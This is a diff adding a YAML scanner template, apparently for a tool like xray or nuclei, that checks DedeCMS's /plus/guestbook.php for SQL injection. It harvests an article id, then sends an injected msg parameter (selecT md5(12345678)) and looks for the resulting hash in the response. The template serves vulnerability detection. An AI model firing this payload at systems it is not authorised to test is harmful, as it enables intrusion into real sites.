@@ -1,0 +1,23 @@
+name: 织梦内容管理系统-guestbook-SQL注入
+description: >
+  SQL注入
+alwaysExecute: false
+matchCount: 3
+rules:
+  - method: GET
+    path: /plus/guestbook.php
+    expression:
+      status: 200
+    search: action=admin&id=(?P<articleid>\d{1,20})
+  - method: GET
+    path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5(12345678)),email='
+    follow_redirects: true
+    expression:
+      status: 200
+  - method: GET
+    path: /plus/guestbook.php
+    follow_redirects: true
+    expression:
+      status: 200
+      body_all:
+        - "25d55ad283aa400af464c76d713c07ad"
